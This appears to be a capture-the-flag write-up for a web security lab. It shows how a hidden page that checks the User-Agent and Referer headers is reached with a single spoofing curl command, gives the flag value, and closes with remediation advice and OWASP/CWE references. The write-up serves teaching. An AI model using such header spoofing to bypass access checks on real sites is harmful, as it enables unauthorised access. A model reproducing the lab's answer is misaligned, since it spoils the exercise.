# Hidden Page Access via HTTP Header Spoofing

## Summary

This breach exploits a page that gates access based on two HTTP headers — the `User-Agent` and the `Referer`. The server only serves the protected content when it receives a specific user agent string (`ft_bornToSec`) and a specific referer URL (`https://www.nsa.gov/`). Since both of these headers are fully controlled by the client, an attacker can spoof them trivially with a single `curl` command and gain access to the hidden page.

---

## Category

**Security Misconfiguration / Broken Access Control**
OWASP: [A01:2021 – Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)

---

## Steps to Reproduce

### 1. Discover the hidden page URL

The target page is accessed via a `page` query parameter pointing to a SHA-256-like hash:

```
http://10.11.10.2:80/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f
```

Visiting this URL in a normal browser returns nothing useful — the server silently withholds the content because the request headers don't match what it expects.

### 2. Identify the required headers

By examining the page source, HTTP responses, or project hints, two requirements emerge:

| Header | Required Value |
|---|---|
| `User-Agent` | `ft_bornToSec` |
| `Referer` | `https://www.nsa.gov/` |

The server checks both of these before deciding whether to render the flag.

### 3. Craft the spoofed request

Use `curl` to send the request with both headers manually set:

```bash
curl \
  -A "ft_bornToSec" \
  -e "https://www.nsa.gov/" \
  "http://10.11.10.2:80/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f" \
  | grep flag
```

**Flag breakdown:**
- `-A "ft_bornToSec"` — sets the `User-Agent` header
- `-e "https://www.nsa.gov/"` — sets the `Referer` header

### 4. Flag

The server renders the hidden page and the flag is present in the response:

```
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

---

## Why This Works

Both `User-Agent` and `Referer` are standard HTTP request headers that the **client sets and sends**. They are informational by design — the server has no way to verify them. Any HTTP client (curl, Python requests, Burp Suite, a browser extension) can set them to any arbitrary string.

Using them as an access control mechanism is equivalent to locking a door and leaving the key taped to the outside.

---

## Root Cause

| Problem | Detail |
|---|---|
| Access control based on `User-Agent` | Clients set their own user agent — it cannot be trusted |
| Access control based on `Referer` | The referer header is optional and fully client-controlled |
| No real authentication | There is no session, token, or credential check on the hidden page |
| Security through obscurity | The obscure page hash and header check create an illusion of protection |

---

## Remediation

### 1. Never use HTTP headers as access controls

`User-Agent`, `Referer`, `X-Forwarded-For`, and similar headers are client-supplied and must never be trusted for security decisions. They may be used for analytics, logging, or UX purposes — never for authorization.

### 2. Protect sensitive pages with real authentication

Any page that should not be publicly accessible must require a verified session or token:

```python
# Flask example
from functools import wraps
from flask import session, abort

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if "user_id" not in session:
            abort(403)
        return f(*args, **kwargs)
    return decorated

@app.route("/hidden-page")
@login_required
def hidden_page():
    return render_template("hidden.html")
```

### 3. Do not rely on obscure URLs as access control

A hard-to-guess URL (like a long hash) provides some obscurity but no real security — once the URL is known (through source code, logs, or enumeration), it is fully accessible without any credential. Obscurity can be a minor additional layer, but never a primary one.

### 4. Apply the principle of least privilege

Ask: *"Who is allowed to access this?"* If the answer is not "everyone", then a real authentication and authorization check must be in place — not a header comparison.

---

## References

- [OWASP: Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [OWASP: Testing for Bypassing Authorization Schema](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema)
- [CWE-807: Reliance on Untrusted Inputs in a Security Decision](https://cwe.mitre.org/data/definitions/807.html)
- [CWE-290: Authentication Bypass by Spoofing](https://cwe.mitre.org/data/definitions/290.html)
- [MDN: Referer header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer)
- [MDN: User-Agent header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent)
